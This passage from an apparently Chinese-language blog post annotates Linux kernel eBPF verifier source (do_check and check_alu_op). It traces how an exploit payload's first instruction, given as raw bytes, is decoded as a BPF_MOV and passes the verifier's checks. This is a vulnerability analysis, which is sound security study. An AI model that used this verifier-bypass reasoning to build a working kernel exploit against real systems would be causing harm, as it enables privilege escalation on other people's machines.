class="line"></span><br><span class="line">        <span class="keyword">if</span> (++insn_processed &gt; <span class="number">32768</span>) &#123; <span class="comment">// 判断bpf指令数是否过多</span></span><br><span class="line">            verbose(<span class="string">&quot;BPF program is too large. Proccessed %d insn\n&quot;</span>,</span><br><span class="line">                insn_processed);</span><br><span class="line">            <span class="keyword">return</span> -E2BIG;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        err = is_state_visited(env, insn_idx); <span class="comment">// 判断是否存在等价状态</span></span><br><span class="line">        <span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> err;</span><br><span class="line">        <span class="keyword">if</span> (err == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="comment">/* found equivalent state, can prune the search */</span></span><br><span class="line">            <span class="keyword">if</span> (log_level) &#123;</span><br><span class="line">                <span class="keyword">if</span> (do_print_state)</span><br><span class="line">                    verbose(<span class="string">&quot;\nfrom %d to %d: safe\n&quot;</span>,</span><br><span class="line">                        prev_insn_idx, insn_idx);</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    verbose(<span class="string">&quot;%d: safe\n&quot;</span>, insn_idx);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">goto</span> process_bpf_exit;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (log_level &amp;&amp; do_print_state) &#123;</span><br><span class="line">            verbose(<span class="string">&quot;\nfrom %d to %d:&quot;</span>, prev_insn_idx, insn_idx);</span><br><span class="line">            print_verifier_state(env);</span><br><span class="line">            do_print_state = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (log_level) &#123;</span><br><span class="line">            verbose(<span class="string">&quot;%d: &quot;</span>, insn_idx);</span><br><span class="line">            print_bpf_insn(insn);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (class == BPF_ALU || class == BPF_ALU64) &#123; <span class="comment">//判断class类型，此为第一句payload进入的分支</span></span><br><span class="line">            err = check_alu_op(env, insn);</span><br><span class="line">            <span class="keyword">if</span> (err)</span><br><span class="line">                <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (class == BPF_LDX) &#123;</span><br><span class="line">            <span class="keyword">enum</span> bpf_reg_type src_reg_type;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* check for reserved fields is already done */</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">/* check src operand */</span></span><br><span class="line">            err = check_reg_arg(regs, insn-&gt;src_reg, SRC_OP);</span><br><span class="line">            <span class="keyword">if</span> (err)</span><br><span class="line">                <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">            err = check_reg_arg(regs, insn-&gt;dst_reg, DST_OP_NO_MARK);</span><br><span class="line">            <span class="keyword">if</span> (err)</span><br><span class="line">                <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">            src_reg_type = regs[insn-&gt;src_reg].type;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* check that memory (src_reg + off) is readable,</span></span><br><span class="line"><span class="comment">             * the state of dst_reg will be updated by this func</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            err = check_mem_access(env, insn-&gt;src_reg, insn-&gt;off,</span><br><span class="line">                           BPF_SIZE(insn-&gt;code), BPF_READ,</span><br><span class="line">                           insn-&gt;dst_reg);</span><br><span class="line">            <span class="keyword">if</span> (err)</span><br><span class="line">                <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (BPF_SIZE(insn-&gt;code) != BPF_W) &#123;</span><br><span class="line">                insn_idx++;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (insn-&gt;imm == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="comment">/* saw a valid insn</span></span><br><span class="line"><span class="comment">                 * dst_reg = *(u32 *)(src_reg + off)</span></span><br><span class="line"><span class="comment">                 * use reserved &#x27;imm&#x27; field to mark this insn</span></span><br><span class="line"><span class="comment">                 */</span></span><br><span class="line">                insn-&gt;imm = src_reg_type;</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (src_reg_type != insn-&gt;imm &amp;&amp;</span><br><span class="line">                   (src_reg_type == PTR_TO_CTX ||</span><br><span class="line">                    insn-&gt;imm == PTR_TO_CTX)) &#123;</span><br><span class="line">                <span class="comment">/* ABuser program is trying to use the same insn</span></span><br><span class="line"><span class="comment">                 * dst_reg = *(u32*) (src_reg + off)</span></span><br><span class="line"><span class="comment">                 * with different pointer types:</span></span><br><span class="line"><span class="comment">                 * src_reg == ctx in one branch and</span></span><br><span class="line"><span class="comment">                 * src_reg == stack|map in some other branch.</span></span><br><span class="line"><span class="comment">                 * Reject it.</span></span><br><span class="line"><span class="comment">                 */</span></span><br><span class="line">                verbose(<span class="string">&quot;same insn cannot be used with different pointers\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> -EINVAL;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (class == BPF_STX) &#123;</span><br><span class="line">            <span class="keyword">enum</span> bpf_reg_type dst_reg_type;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (BPF_MODE(insn-&gt;code) == BPF_XADD) &#123;</span><br><span class="line">                err = check_xadd(env, insn);</span><br><span class="line">                <span class="keyword">if</span> (err)</span><br><span class="line">                    <span class="keyword">return</span> err;</span><br><span class="line">                insn_idx++;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* check src1 operand */</span></span><br><span class="line">            err = check_reg_arg(regs, insn-&gt;src_reg, SRC_OP);</span><br><span class="line">            <span class="keyword">if</span> (err)</span><br><span class="line">                <span class="keyword">return</span> err;</span><br><span class="line">            <span class="comment">/* check src2 operand */</span></span><br><span class="line">            err = check_reg_arg(regs, insn-&gt;dst_reg, SRC_OP);</span><br><span class="line">            <span class="keyword">if</span> (err)</span><br><span class="line">                <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">            dst_reg_type = regs[insn-&gt;dst_reg].type;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* check that memory (dst_reg + off) is writeable */</span></span><br><span class="line">            err = check_mem_access(env, insn-&gt;dst_reg, insn-&gt;off,</span><br><span class="line">                           BPF_SIZE(insn-&gt;code), BPF_WRITE,</span><br><span class="line">                           insn-&gt;src_reg);</span><br><span class="line">            <span class="keyword">if</span> (err)</span><br><span class="line">                <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (insn-&gt;imm == <span class="number">0</span>) &#123;</span><br><span class="line">                insn-&gt;imm = dst_reg_type;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (dst_reg_type != insn-&gt;imm &amp;&amp;</span><br><span class="line">                   (dst_reg_type == PTR_TO_CTX ||</span><br><span class="line">                    insn-&gt;imm == PTR_TO_CTX)) &#123;</span><br><span class="line">                verbose(<span class="string">&quot;same insn cannot be used with different pointers\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> -EINVAL;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (class == BPF_ST) &#123;</span><br><span class="line">            <span class="keyword">if</span> (BPF_MODE(insn-&gt;code) != BPF_MEM ||</span><br><span class="line">                insn-&gt;src_reg != BPF_REG_0) &#123;</span><br><span class="line">                verbose(<span class="string">&quot;BPF_ST uses reserved fields\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> -EINVAL;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">/* check src operand */</span></span><br><span class="line">            err = check_reg_arg(regs, insn-&gt;dst_reg, SRC_OP);</span><br><span class="line">            <span class="keyword">if</span> (err)</span><br><span class="line">                <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* check that memory (dst_reg + off) is writeable */</span></span><br><span class="line">            err = check_mem_access(env, insn-&gt;dst_reg, insn-&gt;off,</span><br><span class="line">                           BPF_SIZE(insn-&gt;code), BPF_WRITE,</span><br><span class="line">                           <span class="number">-1</span>);</span><br><span class="line">            <span class="keyword">if</span> (err)</span><br><span class="line">                <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (class == BPF_JMP) &#123; <span class="comment">// 第二行payload进入此分支</span></span><br><span class="line">            u8 opcode = BPF_OP(insn-&gt;code);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (opcode == BPF_CALL) &#123;</span><br><span class="line">                <span class="keyword">if</span> (BPF_SRC(insn-&gt;code) != BPF_K ||</span><br><span class="line">                    insn-&gt;off != <span class="number">0</span> ||</span><br><span class="line">                    insn-&gt;src_reg != BPF_REG_0 ||</span><br><span class="line">                    insn-&gt;dst_reg != BPF_REG_0) &#123;</span><br><span class="line">                    verbose(<span class="string">&quot;BPF_CALL uses reserved fields\n&quot;</span>);</span><br><span class="line">                    <span class="keyword">return</span> -EINVAL;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                err = check_call(env, insn-&gt;imm);</span><br><span class="line">                <span class="keyword">if</span> (err)</span><br><span class="line">                    <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (opcode == BPF_JA) &#123;</span><br><span class="line">                <span class="keyword">if</span> (BPF_SRC(insn-&gt;code) != BPF_K ||</span><br><span class="line">                    insn-&gt;imm != <span class="number">0</span> ||</span><br><span class="line">                    insn-&gt;src_reg != BPF_REG_0 ||</span><br><span class="line">                    insn-&gt;dst_reg != BPF_REG_0) &#123;</span><br><span class="line">                    verbose(<span class="string">&quot;BPF_JA uses reserved fields\n&quot;</span>);</span><br><span class="line">                    <span class="keyword">return</span> -EINVAL;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                insn_idx += insn-&gt;off + <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (opcode == BPF_EXIT) &#123;</span><br><span class="line">                <span class="keyword">if</span> (BPF_SRC(insn-&gt;code) != BPF_K ||</span><br><span class="line">                    insn-&gt;imm != <span class="number">0</span> ||</span><br><span class="line">                    insn-&gt;src_reg != BPF_REG_0 ||</span><br><span class="line">                    insn-&gt;dst_reg != BPF_REG_0) &#123;</span><br><span class="line">                    verbose(<span class="string">&quot;BPF_EXIT uses reserved fields\n&quot;</span>);</span><br><span class="line">                    <span class="keyword">return</span> -EINVAL;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">/* eBPF calling convetion is such that R0 is used</span></span><br><span class="line"><span class="comment">                 * to return the value from eBPF program.</span></span><br><span class="line"><span class="comment">                 * Make sure that it&#x27;s readable at this time</span></span><br><span class="line"><span class="comment">                 * of bpf_exit, which means that program wrote</span></span><br><span class="line"><span class="comment">                 * something into it earlier</span></span><br><span class="line"><span class="comment">                 */</span></span><br><span class="line">                err = check_reg_arg(regs, BPF_REG_0, SRC_OP);</span><br><span class="line">                <span class="keyword">if</span> (err)</span><br><span class="line">                    <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (is_pointer_value(env, BPF_REG_0)) &#123;</span><br><span class="line">                    verbose(<span class="string">&quot;R0 leaks addr as return value\n&quot;</span>);</span><br><span class="line">                    <span class="keyword">return</span> -EACCES;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">process_bpf_exit:</span><br><span class="line">                insn_idx = pop_stack(env, &amp;prev_insn_idx);</span><br><span class="line">                <span class="keyword">if</span> (insn_idx &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    do_print_state = <span class="literal">true</span>;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123; <span class="comment">// 第二行payload进入此分支</span></span><br><span class="line">                err = check_cond_jmp_op(env, insn, &amp;insn_idx);</span><br><span class="line">                <span class="keyword">if</span> (err)</span><br><span class="line">                    <span class="keyword">return</span> err;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (class == BPF_LD) &#123;</span><br><span class="line">            u8 mode = BPF_MODE(insn-&gt;code);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (mode == BPF_ABS || mode == BPF_IND) &#123;</span><br><span class="line">                err = check_ld_abs(env, insn);</span><br><span class="line">                <span class="keyword">if</span> (err)</span><br><span class="line">                    <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (mode == BPF_IMM) &#123;</span><br><span class="line">                err = check_ld_imm(env, insn);</span><br><span class="line">                <span class="keyword">if</span> (err)</span><br><span class="line">                    <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">                insn_idx++;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                verbose(<span class="string">&quot;invalid BPF_LD mode\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> -EINVAL;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            verbose(<span class="string">&quot;unknown insn class %d\n&quot;</span>, class);</span><br><span class="line">            <span class="keyword">return</span> -EINVAL;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        insn_idx++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>那么来看第一行<code>\xb4\x09\x00\x00\xff\xff\xff\xff</code></p>
<p>通过<code>BPF_CLASS</code>宏计算class后，可以得出class：<code>0xb4 &amp; 0x07 = 0x04</code></p>
<p>那么进入<code>if (class == BPF_ALU || class == BPF_ALU64)</code>分支，执行<code>check_alu_op</code>函数</p>
<p>来看看<code>check_alu_op</code>函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* check validity of 32-bit and 64-bit arithmetic operations */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">check_alu_op</span><span class="params">(struct verifier_env *env, struct bpf_insn *insn)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">reg_state</span> *<span class="title">regs</span> =</span> env-&gt;cur_state.regs;</span><br><span class="line">    u8 opcode = BPF_OP(insn-&gt;code); <span class="comment">// BPF_OP宏：#define BPF_OP(code) ((code) &amp; 0xf0)</span></span><br><span class="line">    <span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (opcode == BPF_END || opcode == BPF_NEG) &#123;</span><br><span class="line">        <span class="keyword">if</span> (opcode == BPF_NEG) &#123;</span><br><span class="line">            <span class="keyword">if</span> (BPF_SRC(insn-&gt;code) != <span class="number">0</span> ||</span><br><span class="line">                insn-&gt;src_reg != BPF_REG_0 ||</span><br><span class="line">                insn-&gt;off != <span class="number">0</span> || insn-&gt;imm != <span class="number">0</span>) &#123;</span><br><span class="line">                verbose(<span class="string">&quot;BPF_NEG uses reserved fields\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> -EINVAL;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (insn-&gt;src_reg != BPF_REG_0 || insn-&gt;off != <span class="number">0</span> ||</span><br><span class="line">                (insn-&gt;imm != <span class="number">16</span> &amp;&amp; insn-&gt;imm != <span class="number">32</span> &amp;&amp; insn-&gt;imm != <span class="number">64</span>)) &#123;</span><br><span class="line">                verbose(<span class="string">&quot;BPF_END uses reserved fields\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> -EINVAL;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* check src operand */</span></span><br><span class="line">        err = check_reg_arg(regs, insn-&gt;dst_reg, SRC_OP);</span><br><span class="line">        <span class="keyword">if</span> (err)</span><br><span class="line">            <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (is_pointer_value(env, insn-&gt;dst_reg)) &#123;</span><br><span class="line">            verbose(<span class="string">&quot;R%d pointer arithmetic prohibited\n&quot;</span>,</span><br><span class="line">                insn-&gt;dst_reg);</span><br><span class="line">            <span class="keyword">return</span> -EACCES;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* check dest operand */</span></span><br><span class="line">        err = check_reg_arg(regs, insn-&gt;dst_reg, DST_OP);</span><br><span class="line">        <span class="keyword">if</span> (err)</span><br><span class="line">            <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (opcode == BPF_MOV) &#123; <span class="comment">// 判断指令是否是MOV指令，第一句payload进入此分支</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (BPF_SRC(insn-&gt;code) == BPF_X) &#123; </span><br><span class="line">            <span class="keyword">if</span> (insn-&gt;imm != <span class="number">0</span> || insn-&gt;off != <span class="number">0</span>) &#123;</span><br><span class="line">                verbose(<span class="string">&quot;BPF_MOV uses reserved fields\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> -EINVAL;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* check src operand */</span></span><br><span class="line">            err = check_reg_arg(regs, insn-&gt;src_reg, SRC_OP);</span><br><span class="line">            <span class="keyword">if</span> (err)</span><br><span class="line">                <span class="keyword">return</span> err;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (insn-&gt;src_reg != BPF_REG_0 || insn-&gt;off != <span class="number">0</span>) &#123;</span><br><span class="line">                verbose(<span class="string">&quot;BPF_MOV uses reserved fields\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> -EINVAL;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* check dest operand */</span></span><br><span class="line">        err = check_reg_arg(regs, insn-&gt;dst_reg, DST_OP); <span class="comment">//检查操作数</span></span><br><span class="line">        <span class="keyword">if</span> (err)</span><br><span class="line">            <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (BPF_SRC(insn-&gt;code) == BPF_X) &#123;</span><br><span class="line">            <span class="keyword">if</span> (BPF_CLASS(insn-&gt;code) == BPF_ALU64) &#123;</span><br><span class="line">                <span class="comment">/* case: R1 = R2</span></span><br><span class="line"><span class="comment">                 * copy register state to dest reg</span></span><br><span class="line"><span class="comment">                 */</span></span><br><span class="line">                regs[insn-&gt;dst_reg] = regs[insn-&gt;src_reg];</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (is_pointer_value(env, insn-&gt;src_reg)) &#123;</span><br><span class="line">                    verbose(<span class="string">&quot;R%d partial copy of pointer\n&quot;</span>,</span><br><span class="line">                        insn-&gt;src_reg);</span><br><span class="line">                    <span class="keyword">return</span> -EACCES;</span><br><span class="line">                &#125;</span><br><span class="line">                regs[insn-&gt;dst_reg].type = UNKNOWN_VALUE;</span><br><span class="line">                regs[insn-&gt;dst_reg].map_ptr = <span class="literal">NULL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">/* case: R = imm</span></span><br><span class="line"><span class="comment">             * remember the value we stored into this reg</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            regs[insn-&gt;dst_reg].type = CONST_IMM;</span><br><span class="line">            regs[insn-&gt;dst_reg].imm = insn-&gt;imm;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (opcode &gt; BPF_END) &#123;</span><br><span class="line">        verbose(<span class="string">&quot;invalid BPF_ALU opcode %x\n&quot;</span>, opcode);</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;    <span class="comment">/* all other ALU ops: and, sub, xor, add, ... */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">bool</span> stack_relative = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (BPF_SRC(insn-&gt;code) == BPF_X) &#123;</span><br><span class="line">            <span class="keyword">if</span> (insn-&gt;imm != <span class="number">0</span> || insn-&gt;off != <span class="number">0</span>) &#123;</span><br><span class="line">                verbose(<span class="string">&quot;BPF_ALU uses reserved fields\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> -EINVAL;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">/* check src1 operand */</span></span><br><span class="line">            err = check_reg_arg(regs, insn-&gt;src_reg, SRC_OP);</span><br><span class="line">            <span class="keyword">if</span> (err)</span><br><span class="line">                <span class="keyword">return</span> err;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (insn-&gt;src_reg != BPF_REG_0 || insn-&gt;off != <span class="number">0</span>) &#123;</span><br><span class="line">                verbose(<span class="string">&quot;BPF_ALU uses reserved fields\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> -EINVAL;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* check src2 operand */</span></span><br><span class="line">        err = check_reg_arg(regs, insn-&gt;dst_reg, SRC_OP);</span><br><span class="line">        <span class="keyword">if</span> (err)</span><br><span class="line">            <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((opcode == BPF_MOD || opcode == BPF_DIV) &amp;&amp;</span><br><span class="line">            BPF_SRC(insn-&gt;code) == BPF_K &amp;&amp; insn-&gt;imm == <span class="number">0</span>) &#123;</span><br><span class="line">            verbose(<span class="string">&quot;div by zero\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> -EINVAL;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((opcode == BPF_LSH || opcode == BPF_RSH ||</span><br><span class="line">             opcode == BPF_ARSH) &amp;&amp; BPF_SRC(insn-&gt;code) == BPF_K) &#123;</span><br><span class="line">            <span class="keyword">int</span> size = BPF_CLASS(insn-&gt;code) == BPF_ALU64 ? <span class="number">64</span> : <span class="number">32</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (insn-&gt;imm &lt; <span class="number">0</span> || insn-&gt;imm &gt;= size) &#123;</span><br><span class="line">                verbose(<span class="string">&quot;invalid shift %d\n&quot;</span>, insn-&gt;imm);</span><br><span class="line">                <span class="keyword">return</span> -EINVAL;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* pattern match &#x27;bpf_add Rx, imm&#x27; instruction */</span></span><br><span class="line">        <span class="keyword">if</span> (opcode == BPF_ADD &amp;&amp; BPF_CLASS(insn-&gt;code) == BPF_ALU64 &amp;&amp;</span><br><span class="line">            regs[insn-&gt;dst_reg].type == FRAME_PTR &amp;&amp;</span><br><span class="line">            BPF_SRC(insn-&gt;code) == BPF_K) &#123;</span><br><span class="line">            stack_relative = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (is_pointer_value(env, insn-&gt;dst_reg)) &#123;</span><br><span class="line">            verbose(<span class="string">&quot;R%d pointer arithmetic prohibited\n&quot;</span>,</span><br><span class="line">                insn-&gt;dst_reg);</span><br><span class="line">            <span class="keyword">return</span> -EACCES;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (BPF_SRC(insn-&gt;code) == BPF_X &amp;&amp;</span><br><span class="line">               is_pointer_value(env, insn-&gt;src_reg)) &#123;</span><br><span class="line">            verbose(<span class="string">&quot;R%d pointer arithmetic prohibited\n&quot;</span>,</span><br><span class="line">                insn-&gt;src_reg);</span><br><span class="line">            <span class="keyword">return</span> -EACCES;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* check dest operand */</span></span><br><span class="line">        err = check_reg_arg(regs, insn-&gt;dst_reg, DST_OP);</span><br><span class="line">        <span class="keyword">if</span> (err)</span><br><span class="line">            <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (stack_relative) &#123;</span><br><span class="line">            regs[insn-&gt;dst_reg].type = PTR_TO_STACK;</span><br><span class="line">            regs[insn-&gt;dst_reg].imm = insn-&gt;imm;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在此函数中，先计算<code>opcode</code>的值：<code>0xb4 &amp; 0xf0 = 0xb0</code></p>
<p>此值为BPF_MOV宏的值，进入<code>else if (opcode == BPF_MOV)</code>分支</p>
<p>通过一系列校验后，我们主要关心的就是这里的代码</p>
